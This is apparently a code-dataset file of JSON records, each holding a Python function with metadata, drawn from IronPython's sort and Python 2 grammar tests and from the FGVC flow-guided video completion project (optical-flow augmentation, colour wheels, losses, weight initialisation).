{"docstring": "# Testing None as a comparison function.\n\n", "func_signal": "def test_cmpNone(self):\n", "code": "L = range(50)\nrandom.shuffle(L)\nL.sort(None)\nself.assertEqual(L, range(50))", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/test/test_sort.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# 'continue'\n", "func_signal": "def testContinueStmt(self):\n", "code": "i = 1\nwhile i: i = 0; continue\n\nmsg = \"\"\nwhile not msg:\n    msg = \"ok\"\n    try:\n        continue\n        msg = \"continue failed to continue inside try\"\n    except:\n        msg = \"continue inside try called except block\"\nif msg != \"ok\":\n    self.fail(msg)\n\nmsg = \"\"\nwhile not msg:\n    msg = \"finally block not called\"\n    try:\n        continue\n    finally:\n        msg = \"ok\"\nif msg != \"ok\":\n    self.fail(msg)", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# test for outmost iterable precomputation\n", "func_signal": "def testComprehensionSpecials(self):\n", "code": "x = 10; g = (i for i in range(x)); x = 5\nself.assertEqual(len(list(g)), 10)\n\n# This should hold, since we're only precomputing outmost iterable.\nx = 10; t = False; g = ((i,j) for i in range(x) if t for j in range(x))\nx = 5; t = True;\nself.assertEqual([(i,j) for i in range(10) for j in range(5)], list(g))\n\n# Grammar allows multiple adjacent 'if's in listcomps and genexps,\n# even though it's silly. Make sure it works (ifelse broke this.)\nself.assertEqual([ x for x in range(10) if x % 2 if x % 3 ], [1, 5, 7])\nself.assertEqual(list(x for x in range(10) if x % 2 if x % 3), [1, 5, 7])\n\n# verify unpacking single element tuples in listcomp/genexp.\nself.assertEqual([x for x, in [(4,), (5,), (6,)]], [4, 5, 6])\nself.assertEqual(list(x for x, in [(7,), (8,), (9,)]), [7, 8, 9])", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# generator expression tests\n", "func_signal": "def testGenexps(self):\n", "code": "g = ([x for x in range(10)] for x in range(1))\nself.assertEqual(g.next(), [x for x in range(10)])\ntry:\n    g.next()\n    self.fail('should produce StopIteration exception')\nexcept StopIteration:\n    pass\n\na = 1\ntry:\n    g = (a for d in a)\n    g.next()\n    self.fail('should produce TypeError')\nexcept TypeError:\n    pass\n\nself.assertEqual(list((x, y) for x in 'abcd' for y in 'abcd'), [(x, y) for x in 'abcd' for y in 'abcd'])\nself.assertEqual(list((x, y) for x in 'ab' for y in 'xy'), [(x, y) for x in 'ab' for y in 'xy'])\n\na = [x for x in range(10)]\nb = (x for x in (y for y in a))\nself.assertEqual(sum(b), sum([x for x in range(10)]))\n\nself.assertEqual(sum(x**2 for x in range(10)), sum([x**2 for x in range(10)]))\nself.assertEqual(sum(x*x for x in range(10) if x%2), sum([x*x for x in range(10) if x%2]))\nself.assertEqual(sum(x for x in (y for y in range(10))), sum([x for x in range(10)]))\nself.assertEqual(sum(x for x in (y for y in (z for z in range(10)))), sum([x for x in range(10)]))\nself.assertEqual(sum(x for x in [y for y in (z for z in range(10))]), sum([x for x in range(10)]))\nself.assertEqual(sum(x for x in (y for y in (z for z in range(10) if True)) if True), sum([x for x in range(10)]))\nself.assertEqual(sum(x for x in (y for y in (z for z in range(10) if True) if False) if True), 0)\ncheck_syntax_error(self, \"foo(x for x in range(10), 100)\")\ncheck_syntax_error(self, \"foo(100, x for x in range(10))\")", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# 'for' exprlist 'in' exprlist ':' suite ['else' ':' suite]\n", "func_signal": "def testFor(self):\n", "code": "for i in 1, 2, 3: pass\nfor i, j, k in (): pass\nelse: pass\nclass Squares:\n    def __init__(self, max):\n        self.max = max\n        self.sofar = []\n    def __len__(self): return len(self.sofar)\n    def __getitem__(self, i):\n        if not 0 <= i < self.max: raise IndexError\n        n = len(self.sofar)\n        while n <= i:\n            self.sofar.append(n*n)\n            n = n+1\n        return self.sofar[i]\nn = 0\nfor x in Squares(10): n = n+x\nif n != 285:\n    self.fail('for over growing sequence')\n\nresult = []\nfor x, in [(1,), (2,), (3,)]:\n    result.append(x)\nself.assertEqual(result, [1, 2, 3])", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# bug 453523 -- list.sort() crasher.\n# If this fails, the most likely outcome is a core dump.\n# Mutations during a list sort should raise a ValueError.\n\n", "func_signal": "def test_bug453523(self):\n", "code": "class C:\n    def __lt__(self, other):\n        if L and random.random() < 0.75:\n            L.pop()\n        else:\n            L.append(3)\n        return random.random() < 0.5\n\nL = [C() for i in range(50)]\nself.assertRaises(ValueError, L.sort)", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/test/test_sort.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "### simple_stmt: small_stmt (';' small_stmt)* [';']\n", "func_signal": "def testSimpleStmt(self):\n", "code": "x = 1; pass; del x\ndef foo():\n    # verify statements that end with semi-colons\n    x = 1; pass; del x;\nfoo()", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# 'del' exprlist\n", "func_signal": "def testDelStmt(self):\n", "code": "abc = [1,2,3]\nx, y, z = abc\nxyz = x, y, z\n\ndel abc\ndel x, y, (z, xyz)", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# simple_stmt | NEWLINE INDENT NEWLINE* (stmt NEWLINE*)+ DEDENT\n", "func_signal": "def testSuite(self):\n", "code": "if 1: pass\nif 1:\n    pass\nif 1:\n    #\n    #\n    #\n    pass\n    pass\n    #\n    pass\n    #", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# 'while' test ':' suite ['else' ':' suite]\n", "func_signal": "def testWhile(self):\n", "code": "while 0: pass\nwhile 0: pass\nelse: pass\n\n# Issue1920: \"while 0\" is optimized away,\n# ensure that the \"else\" clause is still present.\nx = 0\nwhile 0:\n    x = 1\nelse:\n    x = 2\nself.assertEquals(x, 2)", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# Backslash means line continuation:\n", "func_signal": "def testBackslash(self):\n", "code": "x = 1 \\\n+ 1\nself.assertEquals(x, 2, 'backslash for line continuation')\n\n# Backslash does not means continuation in comments :\\\nx = 0\nself.assertEquals(x, 0, 'backslash ending comment')", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# 'class' NAME ['(' [testlist] ')'] ':' suite\n", "func_signal": "def testClassdef(self):\n", "code": "class B: pass\nclass B2(): pass\nclass C1(B): pass\nclass C2(B): pass\nclass D(C1, C2, B): pass\nclass C:\n    def meth1(self): pass\n    def meth2(self, arg): pass\n    def meth3(self, a1, a2): pass\n# decorator: '@' dotted_name [ '(' [arglist] ')' ] NEWLINE\n# decorators: decorator+\n# decorated: decorators (classdef | funcdef)\ndef class_decorator(x):\n    x.decorated = True\n    return x\n@class_decorator\nclass G:\n    pass\nself.assertEqual(G.decorated, True)", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# (exprlist '=')* exprlist\n", "func_signal": "def testExprStmt(self):\n", "code": "1\n1, 2, 3\nx = 1\nx = 1, 2, 3\nx = y = z = 1, 2, 3\nx, y, z = 1, 2, 3\nabc = a, b, c = x, y, z = xyz = 1, 2, (3, 4)\n\ncheck_syntax_error(self, \"x + 1 = 1\")\ncheck_syntax_error(self, \"a + 1 = b + 2\")", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# 'import' dotted_as_names\n", "func_signal": "def testImport(self):\n", "code": "import sys\nimport time, sys\n# 'from' dotted_name 'import' ('*' | '(' import_as_names ')' | import_as_names)\nfrom time import time\nfrom time import (time)\n# not testable inside a function, but already done at top of the module\n# from sys import *\nfrom sys import path, argv\nfrom sys import (path, argv)\nfrom sys import (path, argv,)", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# Verify that the wrapper has been removed\n", "func_signal": "def test_badcmp_with_key(self):\n", "code": "data = 'The quick Brown fox Jumped over The lazy Dog'.split()\nself.assertRaises(TypeError, data.sort, \"bad\", str.lower)", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/test/test_sort.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# 'global' NAME (',' NAME)*\n", "func_signal": "def testGlobal(self):\n", "code": "global a\nglobal a, b\nglobal one, two, three, four, five, six, seven, eight, nine, ten", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# Python 2.4a1 did not always detect mutation\n", "func_signal": "def test_undetected_mutation(self):\n", "code": "memorywaster = []\nfor i in range(20):\n    def mutating_cmp(x, y):\n        L.append(3)\n        L.pop()\n        return cmp(x, y)\n    L = [1,2]\n    self.assertRaises(ValueError, L.sort, mutating_cmp)\n    def mutating_cmp(x, y):\n        L.append(3)\n        del L[:]\n        return cmp(x, y)\n    self.assertRaises(ValueError, L.sort, mutating_cmp)\n    memorywaster = [memorywaster]", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/test/test_sort.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# Verify that the wrapper has been removed\n", "func_signal": "def test_cmp_and_key_combination(self):\n", "code": "def compare(x, y):\n    self.assertEqual(type(x), str)\n    self.assertEqual(type(x), str)\n    return cmp(x, y)\ndata = 'The quick Brown fox Jumped over The lazy Dog'.split()\ndata.sort(cmp=compare, key=str.lower)", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/test/test_sort.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# 'if' test ':' suite ('elif' test ':' suite)* ['else' ':' suite]\n", "func_signal": "def testIf(self):\n", "code": "if 1: pass\nif 1: pass\nelse: pass\nif 0: pass\nelif 0: pass\nif 0: pass\nelif 0: pass\nelif 0: pass\nelif 0: pass\nelse: pass", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# list comprehension tests\n", "func_signal": "def testListcomps(self):\n", "code": "nums = [1, 2, 3, 4, 5]\nstrs = [\"Apple\", \"Banana\", \"Coconut\"]\nspcs = [\"  Apple\", \" Banana \", \"Coco  nut  \"]\n\nself.assertEqual([s.strip() for s in spcs], ['Apple', 'Banana', 'Coco  nut'])\nself.assertEqual([3 * x for x in nums], [3, 6, 9, 12, 15])\nself.assertEqual([x for x in nums if x > 2], [3, 4, 5])\nself.assertEqual([(i, s) for i in nums for s in strs],\n                 [(1, 'Apple'), (1, 'Banana'), (1, 'Coconut'),\n                  (2, 'Apple'), (2, 'Banana'), (2, 'Coconut'),\n                  (3, 'Apple'), (3, 'Banana'), (3, 'Coconut'),\n                  (4, 'Apple'), (4, 'Banana'), (4, 'Coconut'),\n                  (5, 'Apple'), (5, 'Banana'), (5, 'Coconut')])\nself.assertEqual([(i, s) for i in nums for s in [f for f in strs if \"n\" in f]],\n                 [(1, 'Banana'), (1, 'Coconut'), (2, 'Banana'), (2, 'Coconut'),\n                  (3, 'Banana'), (3, 'Coconut'), (4, 'Banana'), (4, 'Coconut'),\n                  (5, 'Banana'), (5, 'Coconut')])\nself.assertEqual([(lambda a:[a**i for i in range(a+1)])(j) for j in range(5)],\n                 [[1], [1, 1], [1, 2, 4], [1, 3, 9, 27], [1, 4, 16, 64, 256]])\n\ndef test_in_func(l):\n    return [None < x < 3 for x in l if x > 2]\n\nself.assertEqual(test_in_func(nums), [False, False, False])\n\ndef test_nested_front():\n    self.assertEqual([[y for y in [x, x + 1]] for x in [1,3,5]],\n                     [[1, 2], [3, 4], [5, 6]])\n\ntest_nested_front()\n\ncheck_syntax_error(self, \"[i, s for i in nums for s in strs]\")\ncheck_syntax_error(self, \"[x if y]\")\n\nsuppliers = [\n  (1, \"Boeing\"),\n  (2, \"Ford\"),\n  (3, \"Macdonalds\")\n]\n\nparts = [\n  (10, \"Airliner\"),\n  (20, \"Engine\"),\n  (30, \"Cheeseburger\")\n]\n\nsuppart = [\n  (1, 10), (1, 20), (2, 20), (3, 30)\n]\n\nx = [\n  (sname, pname)\n    for (sno, sname) in suppliers\n      for (pno, pname) in parts\n        for (sp_sno, sp_pno) in suppart\n          if sno == sp_sno and pno == sp_pno\n]\n\nself.assertEqual(x, [('Boeing', 'Airliner'), ('Boeing', 'Engine'), ('Ford', 'Engine'),\n                     ('Macdonalds', 'Cheeseburger')])", "path": "main/External.LCA_RESTRICTED/Languages/IronPython/27/Lib/lib2to3/tests/data/py2_test_grammar.py", "commit_date": "2015-01-31 00:00:00", "repo_name": "IronLanguages/main", "stars": 1165, "license": "None", "language": "python", "size": 225398}
{"docstring": "# randomly sample scale\n\n", "func_signal": "def spatial_transform(self, img1, img2, flow, valid):\n", "code": "ht, wd = img1.shape[:2]\nmin_scale = np.maximum(\n    (self.crop_size[0] + 1) / float(ht), \n    (self.crop_size[1] + 1) / float(wd))\n\nscale = 2 ** np.random.uniform(self.min_scale, self.max_scale)\nscale_x = np.clip(scale, min_scale, None)\nscale_y = np.clip(scale, min_scale, None)\n\nif np.random.rand() < self.spatial_aug_prob:\n    # rescale the images\n    img1 = cv2.resize(img1, None, fx=scale_x, fy=scale_y, interpolation=cv2.INTER_LINEAR)\n    img2 = cv2.resize(img2, None, fx=scale_x, fy=scale_y, interpolation=cv2.INTER_LINEAR)\n    flow, valid = self.resize_sparse_flow_map(flow, valid, fx=scale_x, fy=scale_y)\n\nif self.do_flip:\n    if np.random.rand() < 0.5: # h-flip\n        img1 = img1[:, ::-1]\n        img2 = img2[:, ::-1]\n        flow = flow[:, ::-1] * [-1.0, 1.0]\n        valid = valid[:, ::-1]\n\nmargin_y = 20\nmargin_x = 50\n\ny0 = np.random.randint(0, img1.shape[0] - self.crop_size[0] + margin_y)\nx0 = np.random.randint(-margin_x, img1.shape[1] - self.crop_size[1] + margin_x)\n\ny0 = np.clip(y0, 0, img1.shape[0] - self.crop_size[0])\nx0 = np.clip(x0, 0, img1.shape[1] - self.crop_size[1])\n\nimg1 = img1[y0:y0+self.crop_size[0], x0:x0+self.crop_size[1]]\nimg2 = img2[y0:y0+self.crop_size[0], x0:x0+self.crop_size[1]]\nflow = flow[y0:y0+self.crop_size[0], x0:x0+self.crop_size[1]]\nvalid = valid[y0:y0+self.crop_size[0], x0:x0+self.crop_size[1]]\nreturn img1, img2, flow, valid", "path": "FGVC/RAFT/utils/augmentor.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "\"\"\"Calculate flow edge and complete it.\n\"\"\"\n\n", "func_signal": "def edge_completion(args, EdgeGenerator, corrFlow, flow_mask, mode):\n", "code": "if mode not in ['forward', 'backward']:\n    raise NotImplementedError\n\nimgH, imgW, _, nFrame = corrFlow.shape\nEdge = np.empty(((imgH, imgW, 0)), dtype=np.float32)\n\nfor i in range(nFrame):\n    print(\"Completing {0} flow edge {1:2d} <---> {2:2d}\".format(mode, i, i + 1), '\\r', end='')\n    flow_mask_img = flow_mask[:, :, i] if mode == 'forward' else flow_mask[:, :, i + 1]\n\n    flow_img_gray = (corrFlow[:, :, 0, i] ** 2 + corrFlow[:, :, 1, i] ** 2) ** 0.5\n    flow_img_gray = flow_img_gray / flow_img_gray.max()\n\n    edge_corr = canny(flow_img_gray, sigma=2, mask=(1 - flow_mask_img).astype(np.bool))\n    edge_completed = infer(args, EdgeGenerator, torch.device('cuda:0'), flow_img_gray, edge_corr, flow_mask_img)\n    Edge = np.concatenate((Edge, edge_completed[..., None]), axis=-1)\n\nreturn Edge", "path": "FGVC/tool/video_completion.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "\"\"\"Prepares the data for video extrapolation.\n\"\"\"\n", "func_signal": "def extrapolation(args, video_ori, corrFlowF_ori, corrFlowB_ori):\n", "code": "imgH, imgW, _, nFrame = video_ori.shape\n\n# Defines new FOV.\nimgH_extr = int(args.H_scale * imgH)\nimgW_extr = int(args.W_scale * imgW)\nH_start = int((imgH_extr - imgH) / 2)\nW_start = int((imgW_extr - imgW) / 2)\n\n# Generates the mask for missing region.\nflow_mask = np.ones(((imgH_extr, imgW_extr)), dtype=np.bool)\nflow_mask[H_start : H_start + imgH, W_start : W_start + imgW] = 0\n\nmask_dilated = gradient_mask(flow_mask)\n\n# Extrapolates the FOV for video.\nvideo = np.zeros(((imgH_extr, imgW_extr, 3, nFrame)), dtype=np.float32)\nvideo[H_start : H_start + imgH, W_start : W_start + imgW, :, :] = video_ori\n\nfor i in range(nFrame):\n    print(\"Preparing frame {0}\".format(i), '\\r', end='')\n    video[:, :, :, i] = cv2.inpaint((video[:, :, :, i] * 255).astype(np.uint8), flow_mask.astype(np.uint8), 3, cv2.INPAINT_TELEA).astype(np.float32)  / 255.\n\n# Extrapolates the FOV for flow.\ncorrFlowF = np.zeros(((imgH_extr, imgW_extr, 2, nFrame - 1)), dtype=np.float32)\ncorrFlowB = np.zeros(((imgH_extr, imgW_extr, 2, nFrame - 1)), dtype=np.float32)\ncorrFlowF[H_start : H_start + imgH, W_start : W_start + imgW, :] = corrFlowF_ori\ncorrFlowB[H_start : H_start + imgH, W_start : W_start + imgW, :] = corrFlowB_ori\n\n\nreturn video, corrFlowF, corrFlowB, flow_mask, mask_dilated, (W_start, H_start), (W_start + imgW, H_start + imgH)", "path": "FGVC/tool/video_completion.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "# spatial augmentation params\n", "func_signal": "def __init__(self, crop_size, min_scale=-0.2, max_scale=0.5, do_flip=True):\n", "code": "        self.crop_size = crop_size\n        self.min_scale = min_scale\n        self.max_scale = max_scale\n        self.spatial_aug_prob = 0.8\n        self.stretch_prob = 0.8\n        self.max_stretch = 0.2\n\n        # flip augmentation params\n        self.do_flip = do_flip\n        self.h_flip_prob = 0.5\n        self.v_flip_prob = 0.1\n\n        # photometric augmentation params\n        self.photo_aug = ColorJitter(brightness=0.4, contrast=0.4, saturation=0.4, hue=0.5/3.14)\n        self.asymmetric_color_aug_prob = 0.2\n        self.eraser_aug_prob = 0.5", "path": "FGVC/RAFT/utils/augmentor.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "\"\"\"Creates a directory if not exist.\n\"\"\"\n", "func_signal": "def create_dir(dir):\n", "code": "if not os.path.exists(dir):\n    os.makedirs(dir)", "path": "FGVC/tool/video_completion.py", "commit_date": "2020-12-06 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "# Compute features\n", "func_signal": "def __call__(self, x, y):\n", "code": "x_vgg, y_vgg = self.vgg(x), self.vgg(y)\n\n# Compute loss\nstyle_loss = 0.0\nstyle_loss += self.criterion(self.compute_gram(x_vgg['relu2_2']), self.compute_gram(y_vgg['relu2_2']))\nstyle_loss += self.criterion(self.compute_gram(x_vgg['relu3_4']), self.compute_gram(y_vgg['relu3_4']))\nstyle_loss += self.criterion(self.compute_gram(x_vgg['relu4_4']), self.compute_gram(y_vgg['relu4_4']))\nstyle_loss += self.criterion(self.compute_gram(x_vgg['relu5_2']), self.compute_gram(y_vgg['relu5_2']))\n\nreturn style_loss", "path": "FGVC/edgeconnect/loss.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "\"\"\"\nGenerates a color wheel for optical flow visualization as presented in:\n    Baker et al. \"A Database and Evaluation Methodology for Optical Flow\" (ICCV, 2007)\n    URL: http://vision.middlebury.edu/flow/flowEval-iccv07.pdf\n\nCode follows the original C++ source code of Daniel Scharstein.\nCode follows the the Matlab source code of Deqing Sun.\n\nReturns:\n    np.ndarray: Color wheel\n\"\"\"\n\n", "func_signal": "def make_colorwheel():\n", "code": "RY = 15\nYG = 6\nGC = 4\nCB = 11\nBM = 13\nMR = 6\n\nncols = RY + YG + GC + CB + BM + MR\ncolorwheel = np.zeros((ncols, 3))\ncol = 0\n\n# RY\ncolorwheel[0:RY, 0] = 255\ncolorwheel[0:RY, 1] = np.floor(255*np.arange(0,RY)/RY)\ncol = col+RY\n# YG\ncolorwheel[col:col+YG, 0] = 255 - np.floor(255*np.arange(0,YG)/YG)\ncolorwheel[col:col+YG, 1] = 255\ncol = col+YG\n# GC\ncolorwheel[col:col+GC, 1] = 255\ncolorwheel[col:col+GC, 2] = np.floor(255*np.arange(0,GC)/GC)\ncol = col+GC\n# CB\ncolorwheel[col:col+CB, 1] = 255 - np.floor(255*np.arange(CB)/CB)\ncolorwheel[col:col+CB, 2] = 255\ncol = col+CB\n# BM\ncolorwheel[col:col+BM, 2] = 255\ncolorwheel[col:col+BM, 0] = np.floor(255*np.arange(0,BM)/BM)\ncol = col+BM\n# MR\ncolorwheel[col:col+MR, 2] = 255 - np.floor(255*np.arange(MR)/MR)\ncolorwheel[col:col+MR, 0] = 255\nreturn colorwheel", "path": "FGVC/RAFT/utils/flow_viz.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "# randomly sample scale\n", "func_signal": "def spatial_transform(self, img1, img2, flow):\n", "code": "ht, wd = img1.shape[:2]\nmin_scale = np.maximum(\n    (self.crop_size[0] + 8) / float(ht), \n    (self.crop_size[1] + 8) / float(wd))\n\nscale = 2 ** np.random.uniform(self.min_scale, self.max_scale)\nscale_x = scale\nscale_y = scale\nif np.random.rand() < self.stretch_prob:\n    scale_x *= 2 ** np.random.uniform(-self.max_stretch, self.max_stretch)\n    scale_y *= 2 ** np.random.uniform(-self.max_stretch, self.max_stretch)\n\nscale_x = np.clip(scale_x, min_scale, None)\nscale_y = np.clip(scale_y, min_scale, None)\n\nif np.random.rand() < self.spatial_aug_prob:\n    # rescale the images\n    img1 = cv2.resize(img1, None, fx=scale_x, fy=scale_y, interpolation=cv2.INTER_LINEAR)\n    img2 = cv2.resize(img2, None, fx=scale_x, fy=scale_y, interpolation=cv2.INTER_LINEAR)\n    flow = cv2.resize(flow, None, fx=scale_x, fy=scale_y, interpolation=cv2.INTER_LINEAR)\n    flow = flow * [scale_x, scale_y]\n\nif self.do_flip:\n    if np.random.rand() < self.h_flip_prob: # h-flip\n        img1 = img1[:, ::-1]\n        img2 = img2[:, ::-1]\n        flow = flow[:, ::-1] * [-1.0, 1.0]\n\n    if np.random.rand() < self.v_flip_prob: # v-flip\n        img1 = img1[::-1, :]\n        img2 = img2[::-1, :]\n        flow = flow[::-1, :] * [1.0, -1.0]\n\ny0 = np.random.randint(0, img1.shape[0] - self.crop_size[0])\nx0 = np.random.randint(0, img1.shape[1] - self.crop_size[1])\n\nimg1 = img1[y0:y0+self.crop_size[0], x0:x0+self.crop_size[1]]\nimg2 = img2[y0:y0+self.crop_size[0], x0:x0+self.crop_size[1]]\nflow = flow[y0:y0+self.crop_size[0], x0:x0+self.crop_size[1]]\n\nreturn img1, img2, flow", "path": "FGVC/RAFT/utils/augmentor.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "\"\"\"\ncompute optical flow color map\n:param u: optical flow horizontal map\n:param v: optical flow vertical map\n:return: optical flow in color code\n\"\"\"\n", "func_signal": "def compute_color(self, u, v):\n", "code": "[h, w] = u.shape\nimg = np.zeros([h, w, 3])\nnanIdx = np.isnan(u) | np.isnan(v)\nu[nanIdx] = 0\nv[nanIdx] = 0\n\ncolorwheel = self.make_color_wheel()\nncols = np.size(colorwheel, 0)\n\nrad = np.sqrt(u**2+v**2)\n\na = np.arctan2(-v, -u) / np.pi\n\nfk = (a+1) / 2 * (ncols - 1) + 1\n\nk0 = np.floor(fk).astype(int)\n\nk1 = k0 + 1\nk1[k1 == ncols+1] = 1\nf = fk - k0\n\nfor i in range(0, np.size(colorwheel,1)):\n    tmp = colorwheel[:, i]\n    col0 = tmp[k0-1] / 255\n    col1 = tmp[k1-1] / 255\n    col = (1-f) * col0 + f * col1\n\n    idx = rad <= 1\n    col[idx] = 1-rad[idx]*(1-col[idx])\n    notidx = np.logical_not(idx)\n\n    col[notidx] *= 0.75\n    img[:, :, i] = np.uint8(np.floor(255 * col*(1-nanIdx)))\n\nreturn img", "path": "FGVC/edgeconnect/dataset.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "\"\"\" Occlusion augmentation \"\"\"\n\n", "func_signal": "def eraser_transform(self, img1, img2, bounds=[50, 100]):\n", "code": "ht, wd = img1.shape[:2]\nif np.random.rand() < self.eraser_aug_prob:\n    mean_color = np.mean(img2.reshape(-1, 3), axis=0)\n    for _ in range(np.random.randint(1, 3)):\n        x0 = np.random.randint(0, wd)\n        y0 = np.random.randint(0, ht)\n        dx = np.random.randint(bounds[0], bounds[1])\n        dy = np.random.randint(bounds[0], bounds[1])\n        img2[y0:y0+dy, x0:x0+dx, :] = mean_color\n\nreturn img1, img2", "path": "FGVC/RAFT/utils/augmentor.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
{"docstring": "'''\ninitialize network's weights\ninit_type: normal | xavier | kaiming | orthogonal\nhttps://github.com/junyanz/pytorch-CycleGAN-and-pix2pix/blob/9451e70673400885567d08a9e97ade2524c700d0/models/networks.py#L39\n'''\n\n", "func_signal": "def init_weights(self, init_type='normal', gain=0.02):\n", "code": "def init_func(m):\n    classname = m.__class__.__name__\n    if hasattr(m, 'weight') and (classname.find('Conv') != -1 or classname.find('Linear') != -1):\n        if init_type == 'normal':\n            nn.init.normal_(m.weight.data, 0.0, gain)\n        elif init_type == 'xavier':\n            nn.init.xavier_normal_(m.weight.data, gain=gain)\n        elif init_type == 'kaiming':\n            nn.init.kaiming_normal_(m.weight.data, a=0, mode='fan_in')\n        elif init_type == 'orthogonal':\n            nn.init.orthogonal_(m.weight.data, gain=gain)\n\n        if hasattr(m, 'bias') and m.bias is not None:\n            nn.init.constant_(m.bias.data, 0.0)\n\n    elif classname.find('BatchNorm2d') != -1:\n        nn.init.normal_(m.weight.data, 1.0, gain)\n        nn.init.constant_(m.bias.data, 0.0)\n\nself.apply(init_func)", "path": "FGVC/edgeconnect/networks.py", "commit_date": "2020-09-21 00:00:00", "repo_name": "vt-vl-lab/FGVC", "stars": 1531, "license": "other", "language": "python", "size": 97}
